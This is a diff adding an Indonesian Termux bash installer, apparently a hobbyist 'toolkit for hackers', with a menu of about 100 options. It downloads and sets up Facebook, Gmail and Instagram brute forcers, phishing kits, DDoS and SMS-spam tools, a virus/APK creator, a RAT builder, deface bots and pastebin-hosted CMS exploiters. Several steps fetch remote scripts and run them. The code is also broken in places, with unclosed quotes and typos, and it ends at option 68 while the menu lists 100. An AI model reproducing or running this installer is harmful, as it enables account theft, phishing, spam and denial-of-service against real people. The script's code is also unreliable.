@@ -1,0 +1,1682 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#no recode babi lu gk tau bikin sc berapa lama hah!!!
+#recode gk punya tangan otak
+# Auto Install Tools v.1.0
+# Bersihkan Layar
+clear
+
+blue='\e[0;34'
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+
+###################################################
+# CTRL C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
+sleep 1
+echo ""
+echo -e $green"[#]> Terima kasih sudah make tools saya ajg... "
+sleep 1
+echo ""
+echo -e $white"[#]> hanz solo gans slurr ... "
+read enter
+exit
+}
+echo -e $blue"         _   _                   _____       _       
+echo -e $blue"        | | | |                 /  ___|     | |      
+echo -e $blue"        | |_| | __ _ _ __  ____ \ `--.  ___ | | ___  
+echo -e $blue"        |  _  |/ _` | '_ \|_  /  `--. \/ _ \| |/ _ \ 
+echo -e $blue"        | | | | (_| | | | |/ /  /\__/ / (_) | | (_) |
+echo -e $blue"        \_| |_/\__,_|_| |_/___| \____/ \___/|_|\___/ 
+echo -e $red"         ***********************************************"
+echo -e $white"         # $red toolkit for hackers v.01        $white               #"
+echo -e $red"         # $red happy install guys                $red             #"
+echo -e $white"         # $red contact: hanzsolo404@gmail.com $white            #"
+echo -e $red"         # $white greetz :cewe cantik uwu>_<" $red#"
+echo -e $white"         # $white copyright : ./Hanz Solo     $white                #"
+echo -e $red"         # $white thanks to :anime 2D girl            #"
+echo -e $blue"         ***********************************************"
+
+sleep 1
+echo -e $red" ganteng but psycopath no recode sc babi bukan sebentar bikinya"
+sleep 1
+
+echo ""
+echo -e $blue" 0)exit
+echo -e $blue" 01) Red Hawk"
+echo -e $blue" 02) D-Tect"
+echo -e $blue" 03) Hunner"
+echo -e $blue" 04) WPScan"
+echo -e $blue" 05) Webdav"
+echo -e $blue" 06) Metasploit"
+echo -e $blue" 07) Kali Nethunter"
+echo -e $blue" 08) Ubuntu"
+echo -e $blue" 09) Youtube Dl"
+echo -e $blue" 10) viSQL "
+echo -e $blue" 11) Weeman"
+echo -e $blue" 12) WFDroid"
+echo -e $blue" 13) FBBrute"
+echo -e $blue" 14) Ngrok"
+echo -e $blue" 15) Torshammer "
+echo -e $blue" 16) RouterSploit "
+echo -e $blue" 17) Hydra "
+echo -e $blue" 18) Weevely "
+echo -e $blue" 19) SQLMap "
+echo -e $blue" 20) Dirbuster "
+echo -e $blue" 21) admin finder "
+echo -e $blue" 22) lokomedia exploiter "
+echo -e $blue" 23) elfinder exploiter "
+echo -e $blue" 24) magento add admin exploiter "
+echo -e $blue" 25) scanner tools "
+echo -e $blue" 26) bing dorker "
+echo -e $blue" 27) katoolin "
+echo -e $blue" 28) arch linux "
+echo -e $blue" 29) linux 
+echo -e $blue" 31) scansubdomain"
+echo -e $blue" 32) aircrack-ng"
+echo -e $blue" 33) joomscan"
+echo -e $blue" 34) bing-ip2hosts"
+echo -e $blue" 35) BlueMaho"
+echo -e $blue" 36) Bluepot"
+echo -e $blue" 37) honeypot"
+echo -e $blue" 38) bot auto deface 1"
+echo -e $blue" 39) bot auto deface 2"
+echo -e $blue" 40) mailer sender cli"
+echo -e $blue" 41) Wordpress Brute Force"
+echo -e $blue" 42) Oh-myzsh theme for termux"
+echo -e $blue" 43) instabot (instagram bot)"
+echo -e $blue" 44) fsociety"
+echo -e $blue" 45) Cms Scanner"
+echo -e $blue" 46) Information Gathering"
+echo -e $blue" 47) com_fabrik exploiter"
+echo -e $blue" 48) com foxcontact exploiter"
+echo -e $blue" 49) gmail brute force"
+echo -e $blue" 50) ezsploit"
+echo -e $blue" 51) spammer-grab sms"
+echo -e $blue" 52) spammer call toko-pedia"
+echo -e $blue" 53) The Fat Rat"
+echo -e $blue" 54) IPGeolocation"
+echo -e $blue" 55) Menampilkan Matrix"
+echo -e $blue" 56) Memunculkan Kereta Api"
+echo -e $blue" 57) Bot Auto Reaction Facebook"
+echo -e $blue" 58) Bot Love Instagram"
+echo -e $blue" 59) NIK dan KK"
+echo -e $blue" 60) Crack hash password"
+echo -e $blue" 62) Bruteforce"
+echo -e $blue" 63) HACK Akun Friends"
+echo -e $blue" 64) Hack Akun Facebook"
+echo -e $blue" 65) create Virus"
+echo -e $blue" 66) LITEDDOS"
+echo -e $blue" 67) Hack Akun Game Mobile Legends"
+echo -e $blue" 68) Spam SMS Grab"
+echo -e $blue" 69) install Lazymux"
+echo -e $blue" 70) Sql Balitbang"
+echo -e $blue" 71) DDOS HAMMER"
+echo -e $blue" 72) DDOS Xerxes"
+echo -e $blue" 73) FBHT"
+echo -e $blue" 74) admin login finder"
+echo -e $blue" 75) Admin Finder"
+echo -e $blue" 76) Spam SMS Jd id"
+echo -e $blue" 77) tembak XL"
+echo -e $blue" 78) INSTALL OSIF (Open Source Information Facebook)"
+echo -e $blue" 79) HACK INSTAGRAM"
+echo -e $blue" 80) lazysqlmap"
+echo -e $blue" 81) Ddos Attack (Trojan)"
+echo -e $blue" 82) SADAP WHATSAPP"
+echo -e $blue" 83) 13 TOOLS facebook"
+echo -e $blue" 84) BOM wa"
+echo -e $blue" 85) Virus Malicius Apk"
+echo -e $blue" 86) Install Santet Online"
+echo -e $blue" 87) litespam"
+echo -e $blue" 88) SPAM TOKOPEDIA"
+echo -e $blue" 89) Dark Fb Mod"
+echo -e $blue" 90) Dark Fb Vip"
+echo -e $blue" 91) Dark Fb Premium"
+echo -e $blue" 92) (PHISING AKUN SOSMED) (acktif)"
+echo -e $blue" 93) HACK KAMERA(SAYCHEESE)"
+echo -e $blue" 94) TOOLS BUG HUNTER"
+echo -e $blue" 95) TOOLS BRUTEFORCE INSTAGRAM"
+echo -e $blue" 96) TOOLS PHISING FB/GAME"
+echo -e $blue" 97) install coding python, ruby, git, php"
+echo -e $blue" 98) install nethunter"
+echo -e $blue" 99)  Spam SMS and Spam Telfon"
+echo -e $blue" 100)  DDOS mbleddos"
+
+echo -e $white""
+read -p "[Hanz Solo@Tools]> " act;
+
+if [ $act = 0 ] || [ $act = 0 ]
+then
+echo -e $green" pesan terakhir "
+sleep 1
+echo -e $green" dear cewe cantik "
+sleep 1
+echo -e $green" i love you "
+sleep 1
+echo -e $green" Please Wait.... "
+sleep 1
+echo -e $green" https://github.com/HanzSolo404 "
+sleep 1
+echo -e $green" contact : hanzsolo404@gmail.com "
+sleep 1
+echo -e $green" blogspot : https://tnghost.blogspot.com/ "
+sleep 1 
+echo -e $green" instagram : https://www.instagram.com/hanz_solo_404/ "
+sleep 1
+echo -e $red" fb : https://web.facebook.com/farhan.effendi.90 "
+sleep 1
+echo -e $green" whatsaap : https://wa.me/6281387831873?text=Kak%20Hanz%20Solo%20Ganz%20boleh%20save%20Nomberhanzgans 
+sleep 1
+echo -e $red" Bye sayang [cewe] :* "
+sleep 1
+exit
+fi
+
+if [ $act = 01 ] || [ $act = 01 ]
+then
+clear
+echo -e $green" Installing Red Hawk "
+sleep 1
+apt update && apt upgrade
+apt install php
+apt install git
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+echo -e $green" install Berhasil "
+fi
+
+if [ $act = 02 ] || [ $act = 02 ]
+then
+clear
+echo -e $green" Installing D-Tect "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+apt-get install python2
+git clone https://github.com/shawarkhanethicalhacker/D-TECT
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 03 ] || [ $act = 03 ]
+then
+clear
+echo -e $green" Installing Hunner "
+sleep 1
+apt-get update && apt-get upgrade
+apt install python
+apt install git
+git clone https://github.com/b3-v3r/Hunner
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 04 ] || [ $act = 04 ]
+then
+clear
+echo -e $green" Installing Wpscan "
+sleep 1
+apt-get update && apt-get upgrade
+apt install ruby
+apt install curl
+apt install git
+git clone https://github.com/wpscanteam/wpscan
+cd ~/wpscan
+gem install bundle
+bundle config build.nokogiri --use-system-libraries
+bundle install
+ruby wpscan.rb --update
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 05 ] || [ $act = 05 ]
+then
+clear
+echo -e $green" Installing Webdav "
+sleep 1
+apt update && apt upgrade
+apt install python2
+pip2 install urllib3 chardet certifi idna requests
+apt install openssl curl
+pkg install libcurl
+mkdir webdav
+cd ~/webdav
+wget https://pastebin.com/raw/HnVyQPtR -O webdav.py
+chmod 777 webdav.py
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 06 ] || [ $act = 06 ]
+then
+clear
+echo -e $green" Installing Metasploit "
+sleep 1
+apt update && apt upgrade
+apt install git
+apt install wget
+wget https://raw.githubusercontent.com/verluchie/termux-metasploit/master/install.sh
+chmod 777 install.sh
+sh install.sh
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 07 ] || [ $act = 07 ]
+then
+clear
+echo -e $green" Installing Kali Nethunter "
+sleep 1
+apt update && apt upgrade
+apt install git
+git clone https://github.com/Hax4us/Nethunter-In-Termux.git
+cd ~/Nethunter-In-Termux
+chmod 777 kalinethunter
+sh kalinethunter
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 08 ] || [ $act = 08 ]
+then
+clear
+echo -e $green" Installing Ubuntu "
+sleep 1
+apt update && apt upgrade
+apt install git
+apt install wget
+apt install proot
+git clone https://github.com/Neo-Oli/termux-ubuntu.git
+cd ~/termux-ubuntu
+chmod +x ubuntu.sh
+sh ubuntu.sh
+echo " Fix network please wait "
+sleep 1
+echo "nameserver 8.8.8.8" > /data/data/com.termux/files/home/termux-ubuntu/ubuntu-fs/etc/resolv.conf
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 09 ] || [ $act = 09 ]
+then
+clear
+echo -e $green" Installing Youtube DL "
+sleep 1
+apt update && apt upgrade
+apt install python
+pip3 install mps_youtube
+pip3 install youtube_dl
+apt install mpv
+echo " Untuk menjalankannya ketik "mpsyt" tanpa tanda petik "
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 10 ] || [ $act = 10 ]
+then
+clear
+echo -e $green" Installing viSQL "
+sleep 1
+apt update && apt upgrade
+pkg install git
+pkg install python2
+git clone https://github.com/blackvkng/viSQL.git
+cd ~/viSQL
+chmod 777 viSQL.py
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 11 ] || [ $act = 11 ]
+then
+clear
+echo -e $green" Installing Weeman "
+sleep 1
+apt update && apt upgrade
+pkg install git
+apt install python2
+git clone https://github.com/samyoyo/weeman
+cd ~/weeman
+pip2 install beautifulsoup
+pip2 install bs4
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 12 ] || [ $act = 12 ]
+then
+clear
+echo -e $green" Installing WFDroid "
+sleep 1
+apt update && apt upgrade
+apt install wget
+mkdir wfdroid
+cd ~/wfdroid
+wget https://raw.githubusercontent.com/bytezcrew/wfdroid-termux/master/wfdinstall
+chmod 777 wfdinstall
+sh wfdinstall
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 13 ] || [ $act = 13 ]
+then
+clear
+sleep 1
+echo -e $green" Installing FBBrute "
+apt install python2
+apt install python2-dev
+apt install wget
+pip2 install mechanize
+mkdir fbbrute
+cd ~/fbbrute
+wget https://pastebin.com/raw/aqMBt2xA -O fbbrute.py
+wget http://override.waper.co/files/password.apk
+mv password.apk password.txt
+chmod 777 fbbrute.py
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 14 ] || [ $act = 14 ]
+then
+clear
+echo -e $green" Installing Ngrok "
+sleep 1
+apt install wget
+mkdir ngrok
+cd ~/ngrok
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+unzip ngrok-stable-linux-arm.zip
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 15 ] || [ $act = 15 ]
+then
+clear
+echo -e $green" Installing Hammer "
+sleep 1
+pkg update
+pkg upgrade
+pkg install python
+pkg install git
+git clone https://github.com/cyweb/hammer
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 16 ] || [ $act = 16 ]
+then
+clear
+echo -e $green" Installing Routersploit "
+sleep 1
+apt install git
+apt install python2
+pip2 install requests
+git clone https://github.com/reverse-shell/routersploit.git
+cd routersploit
+pip install -r requirements.txt
+termux-fix-shebang rsf.py
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 17 ] || [ $act = 17 ]
+then
+clear
+echo -e $green" Installing Hydra "
+sleep 1
+apt update && apt install -y wget
+apt install hydra
+wget http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 18 ] || [ $act = 18 ]
+then
+clear
+echo -e $green" Installing Weevely "
+sleep 1
+pkg update
+pkg upgrade
+git clone https://github.com/glides/Weevely
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 19 ] || [ $act = 19 ]
+then
+clear
+echo -e $green" Installing SQLMap "
+sleep 1
+apt update && apt upgrade
+apt install python2
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 20 ] || [ $act = 20 ]
+then
+clear
+echo -e $green" Installing Dirbuster "
+sleep 1
+apt-get update
+apt-get install python
+apt-get install git
+git clone https://github.com/maurosoria/dirsearch.git
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 21 ] || [ $act = 21 ]
+then
+clear
+echo -e $green" Installing admin finder "
+sleep 1
+apt update && apt upgrade
+apt-get install php
+mkdir adfin
+cd ~/webdav
+wget https://pastebin.com/raw/32txZ6Qr -O adfin.php
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 22 ] || [ $act = 22 ]
+then
+clear
+echo -e $green" installing lokomedia exploiter "
+sleep 1
+apt update && apt upgrade
+apt-get install php
+mkdir lokomed
+cd ~/lokomed
+wget https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
+cd ~/
+echo -e $red" install Berhasil "
+echo -e $red" usage : php lokomedia.php a.txt "
+fi
+
+if [ $act = 23 ] || [ $act = 23 ]
+then
+clear
+echo -e $green" installing elfinder exploiter "
+sleep 1
+apt update && apt upgrade
+apt-get install php
+mkdir elfinder
+cd ~/elfinder
+wget https://pastebin.com/raw/S7Y2V19h -O elfinder.php
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 24 ] || [ $act = 24 ]
+then
+clear
+echo -e $green" installing magento add admin exploiter "
+sleep 1
+apt update && apt upgrade
+apt-get install php
+mkdir magento
+cd ~/magento
+wget https://pastebin.com/raw/PXkG73pG -O magento.php
+cd ~/
+echo -e $red" install Berhasil "
+fi
+
+if [ $act = 25 ] || [ $act = 25 ]
+then
+clear
+echo -e $green" installing scanner tools "
+sleep 1
+apt update && apt upgrade
+apt install python2
+mkdir scanner
+cd ~/scanner
+wget https://pastebin.com/raw/m79t1Zia -O scanner.py
+wget https://pastebin.com/raw/mgKxMWXh -O admins.1337
+wget https://pastebin.com/raw/EafKj98D -O files.1337
+cd ~/
+echo -e $red" Done Install Cuk "
+echo -e $red" usage : python2 scanner.py site.com -m files "
+fi
+
+if [ $act = 26 ] || [ $act = 26 ]
+then
+clear
+echo -e $green" installing bing dorker "
+sleep 1
+apt update && apt upgrade
+apt-get install php
+mkdir bing
+cd ~/bing
+wget https://pastebin.com/raw/tjQY6Tsg -O dorker.php
+cd ~/
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 27 ] || [ $act = 27 ]
+then
+clear
+echo -e $green" installing katoolin "
+sleep 1
+apt update && apt upgrade
+pkg install git
+pkg install python2
+pkg install gnupg
+pkg install nano
+git clone https://github.com/LionSec/katoolin.git
+cd ~/katoolin
+echo -e $green"note :  nano katoolin.py 
+ganti semua kode /etc/apt/source.list dengan /data/data/com.termux/files/usr/etc/apt/sources.list 
+kemudian simpan dengan menekan ctrl O enter kemudian ctrl X . 
+jika tidak ada menu ctrl pada keyboard munculkan dengan menahan tombol volume atas kemudian ketik Q pada keyboard maka menu ctrl akan muncul di atas keyboard
+python2 katoolin.py
+Sisanya bisa mengikuti cara install di atas, Jika menemui masalah gpg error saat melakukan add repository install gnupg-curl dengan perintah pkg install gnupg-curl
+Untuk yg menggunakan termux dengan cpu arm64 (aarch64) tidak bisa menambahkan repositori kali linux karna kali linux tidak support aarch64, 
+jadi sebelum menginstall tools kali di termux wajib dengan android dengan arm32 jika arm64 gunakan gnuroot"
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 28 ] || [ $act = 28 ]
+then
+clear
+echo -e $green" installing arch linux "
+sleep 1
+apt update && apt upgrade
+apt-get install git
+cd ~/
+git clone https://github.com/sdrausty/termux-archlinux.git
+cd termux-archlinux 
+chmod +x setupTermuxArch.sh
+./setupTermuxArch.sh
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 29 ] || [ $act = 29 ]
+then
+clear
+echo -e $green" installing fedora "
+sleep 1
+apt update && apt upgrade
+apt-get install git
+apt install wget
+git clone https://github.com/nmilosev/termux-fedora.git
+cd termux-fedora
+chmod +x termux-fedora.sh
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 30 ] || [ $act = 30 ]
+then
+clear
+echo -e $green" installing hash-Buster "
+sleep 1
+apt update && apt upgrade
+apt install python2 && apt install git
+git clone https://github.com/UltimateHackers/Hash-Buster
+cd Hash-Buster
+sleep 1
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 31 ] || [ $act = 31 ]
+then
+clear
+echo -e $green" installing sudo "
+sleep 1
+apt update && apt upgrade
+pkg install git ncurses-utils
+git clone https://github.com/st42/termux-sudo.git
+cd termux-sudo
+cat sudo > /data/data/com.termux/files/usr/bin/sudo
+chmod 700 /data/data/com.termux/files/usr/bin/sudo
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 32 ] || [ $act = 32 ]
+then
+clear
+echo -e $green" installing aircrack-ng "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install aircrack-ng
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 33 ] || [ $act = 33 ]
+then
+clear
+echo -e $green" installing joomscan "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+apt-get install perl
+git clone https://github.com/rezasp/joomscan.git
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 34 ] || [ $act = 34 ]
+then
+clear
+echo -e $green" installing bing-ip2hosts "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install wget
+wget http://www.morningstarsecurity.com/downloads/bing-ip2hosts-0.4.tar.gz && tar -xzvf bing-ip2hosts-0.4.tar.gz && cp bing-ip2hosts-0.4/bing-ip2hosts /usr/local/bin/t
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 35 ] || [ $act = 35 ]
+then
+clear
+echo -e $green" installing BlueMaho "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+git clone git://git.kali.org/packages/bluemaho.git
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 36 ] || [ $act = 36 ]
+then
+clear
+echo -e $green" installing Bluepot "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+git clone git://git.kali.org/packages/bluepot.git
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 37 ] || [ $act = 37 ]
+then
+clear
+echo -e $green" installing honeypot "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git && apt-get install php
+git clone https://github.com/whackashoe/php-spam-mail-honeypot.git
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 38 ] || [ $act = 38 ]
+then
+clear
+echo -e $green" installing bot auto deface 1 "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git 
+apt-get install wget 
+apt-get install perl 
+apt-get install unzip
+git clone https://github.com/mrcakil/bot.git
+cd bot
+unzip bot.zip
+cd xploit
+chmod 777 bot.pl
+sleep 1
+echo -e $red" Lokasi bot ? /bot/xploit/bot.pl"
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 39 ] || [ $act = 39 ]
+then
+clear
+echo -e $green" installing bot auto deface 2 "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git && apt-get install perl
+git clone https://github.com/Moham3dRiahi/XAttacker
+cd XAttacker
+chmod 777 XAttacker.please
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 40 ] || [ $act = 40 ]
+then
+clear
+echo -e $green" installing mailer-sender "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install php5-cli
+curl -sS https://getcomposer.org/installer | php
+chmod +x composer.phar
+sudo mv composer.phar /usr/bin/composer
+git clone https://github.com/pedro-stanaka/mailer-cli.git
+sleep 1
+echo -e $red" note !! "
+echo -e $red" usage php sendmail.php notification:mailer <email> <subject> <body>; "
+echo -e $red" or "
+echo -e $red" php sendmail.php --help "
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 41 ] || [ $act = 41 ]
+then
+clear
+echo -e $green" installing wordpress brute force "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install python2
+pip install request
+git clone https://github.com/atarantini/wpbf
+sleep 1
+echo -e $red" done install cuk "
+fi
+
+if [ $act = 42 ] || [ $act = 42 ]
+then
+clear
+echo -e $green" installing termux Ohmyzsh "
+sleep 1
+apt-get update && apt-get upgrade
+sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)"
+~/.termux/colors.sh
+sleep 1
+echo -e $red" ganti color ? ketik ~/.termux/colors.sh "
+echo -e $red" Done Install Cuk "
+fi
+
+if [ $act = 43 ] || [ $act = 43 ]
+then
+clear
+echo -e $green" installing Instabot instagram bot "
+sleep 1
+apt-get update && apt-get upgrade
+pkg install python2
+apt-get install git
+apt-get install nano
+git clone https://github.com/instabot-py/instabot.py
+echo -e $red" Done Install Cuk "
+echo -e $red" Please wait... "
+echo -e $red" Please wait... "
+sleep 1
+cd instabot.py
+echo -e $red" ketik nano example.py "
+echo -e $red" masukan username dan password mu"
+echo -e $red" Done cuk "
+fi
+
+if [ $act = 44 ] || [ $act = 44 ]
+then
+clear
+echo -e $green" installing fsociety "
+sleep 1
+apt-get update && apt-get upgrade
+pkg install python
+apt-get install git
+git clone https://github.com/Manisso/fsociety
+echo -e $red" Done Install Cuk "
+echo -e $red" Please wait... "
+echo -e $red" Please wait... "
+sleep 1
+cd fsociety
+echo -e $red" python fsociety.py "
+fi
+
+
+if [ $act = 45 ] || [ $act = 45 ]
+then
+clear
+echo -e $green" installing  CMS Scanner "
+sleep 1
+apt-get update && apt-get upgrade
+pkg install python
+apt-get install git
+git clone https://github.com/Dionach/CMSmap.git
+sleep 1
+cd CMSmap
+echo -e $red" Usage: cmsmap.py -t <URL> "
+fi
+
+if [ $act = 46 ] || [ $act = 46 ]
+then
+clear
+echo -e $green" installing INFORMATION Gathering "
+sleep 1
+apt-get update && apt-get upgrade
+pkg install python
+apt-get install git
+git clone https://github.com/m4ll0k/Infoga.git infoga
+sleep 1
+cd infoga
+pip install -r req
+echo -e $red" Usage: python infoga.py "
+fi
+
+
+if [ $act = 47 ] || [ $act = 47 ]
+then
+clear
+echo -e $green" installing com fabrik exploiter "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install wget
+apt-get install php
+wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
+sleep 1
+echo -e $red" Usage: php com_fabrik.php target.txt "
+fi
+
+
+if [ $act = 48 ] || [ $act = 48 ]
+then
+clear
+echo -e $green" installing com foxcontact exploiter "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install wget
+apt-get install php
+wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php
+sleep 1
+echo -e $red" Usage: php com_foxcontact.php target.txt "
+fi
+
+if [ $act = 49 ] || [ $act = 49 ]
+then
+clear
+echo -e $green" installing gmail brute force "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+git clone https://github.com/JamesAndresCM/Brute_force_gmail
+sleep 1
+echo -e $red" Usage: python2.7 brute_force_gmail.py example@gmail.com PATH_TO_DICTIONARY "
+fi
+
+
+if [ $act = 50 ] || [ $act = 50 ]
+then
+clear
+echo -e $green" installing ezsploit "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+git clone https://github.com/rand0m1ze/ezsploit
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 51 ] || [ $act = 51 ]
+then
+clear
+echo -e $green" installing spammer grab "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+apt-get install python2
+pip install requests
+git clone https://github.com/p4kl0nc4t/Spammer-Grab/
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 52 ] || [ $act = 52 ]
+then
+clear
+echo -e $green" installing spammer toko pedia "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+apt-get install unzip
+apt-get install php
+git clone https://github.com/mrcakil/spam
+cd spam
+unzip toko-pedia.zip
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 53 ] || [ $act = 53 ]
+then
+clear
+echo -e $green" installing TheFatRat "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+git clone https://github.com/Screetsec/TheFatRat.git
+cd TheFatRat
+chmod +x setup.sh && ./setup.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 54 ] || [ $act = 54 ]
+then
+clear
+echo -e $green" installing IPGeolocation "
+sleep 1
+apt-get update && apt-get upgrade
+apt-get install git
+apt install python2
+git clone https://github.com/maldevel/IPGeolocation.git
+cd IPGeolocation
+chmod +x ipgeolocation.py
+pip install -r requirements.txt
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 55 ] || [ $act = 55 ]
+then
+clear
+echo -e $green" Menampilkan Matrix"
+sleep1
+pkg install cmatrix
+cmatrix
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 56 ] || [ $act = 56 ]
+then
+clear
+echo -e $green" Memunculkan Kereta Api "
+sleep1
+pkg install sl
+sl
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 57 ] || [ $act = 57 ]
+then
+clear
+echo -e $green" Bot Auto Reaction Facebook "
+sleep1
+git clone https://github.com/AMVengeance/FB-React.git
+chmod +x FB-React -R
+cd FB-React
+./start
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 58 ] || [ $act = 58 ]
+then
+clear
+echo -e $green" Bot Love Instagram "
+sleep1
+git clone https://github.com/indogram/indotagram.git 
+php indotagram/login.php 
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 59 ] || [ $act = 59 ]
+then
+clear
+echo -e $green" NIK dan KK "
+sleep 1
+pkg install php git
+git clone https://github.com/IndonesiaSecurity/kkktp
+cd kkktp
+php kkktp.php
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 60 ] || [ $act = 60 ]
+then
+clear
+echo -e $green" Crack hash password "
+sleep 1
+git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/
+cd FHX-Hash-Killer
+python2 FHXHashKiller.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 61 ] || [ $act = 61 ]
+then
+clear
+echo -e $green" Install Wifite "
+sleep 1
+git clone https://github.com/derv82/wifite
+cd wifite
+chmod 777 wifite.py
+python2 wifite.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 62 ] || [ $act = 62 ]
+then
+clear
+echo -e $green" Bruteforce "
+sleep 1
+pkg install pip
+pip install wordlist
+pkg install worlist
+wordlist -h
+cd /sdcard
+cat pas.txt
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 63 ] || [ $act = 63 ]
+then
+clear
+echo -e $green" ip geolocation "
+sleep 1
+git clone https://github.com/maldevel/IPGeolocation
+cd IPGeolocation
+chmod +x ipgeolocation.py
+pip install -r requirements.txt
+python ipgeolocation.py -m
+python ipgeolocation.py -t IPnya
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 64 ] || [ $act = 64 ]
+then
+clear
+echo -e $green"  Hack Akun Facebook "
+sleep 1
+pkg install python2-dev
+apt install wget
+dip2 install mechanize
+cd/sterage/emulated/0
+python2 fbbrute.py
+storage/emulated/0/password.txt
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 65 ] || [ $act = 65 ]
+then
+clear
+echo -e $green" create Virus "
+sleep 1
+git clone https://github.com/viruz09/CreaterVirus
+cd CreaterVirus
+python2 creater.py
+sleep 1
+echo -e $red" copy virus $cp agents.apk /lokasi/folder "
+fi
+
+if [ $act = 66 ] || [ $act = 66 ]
+then
+clear
+echo -e $green" LITEDDOS "
+sleep 1
+git clone https://github.com/4L13199/LITEDDOS
+python2 LITEDDOS.py [ip target atau domain] [port] [jumlah traffic]
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 67 ] || [ $act = 67 ]
+then
+clear
+echo -e $green"  Hack Akun Game Mobile Legends "
+sleep 1
+git clone https://github.com/Senitopeng/PhisingGame.git
+cd PhisingGame
+python2 phising.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 68 ] || [ $act = 68 ]
+then
+clear
+echo -e $green" Spam SMS Grab "
+sleep1
+pkg install python2 git
+pip2 install requests
+git clone https://github.com/p4kl0nc4t/Spammer-Grab
+cd Spammer-Grab
+chmod +x spammer.py
+python2 spammer.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
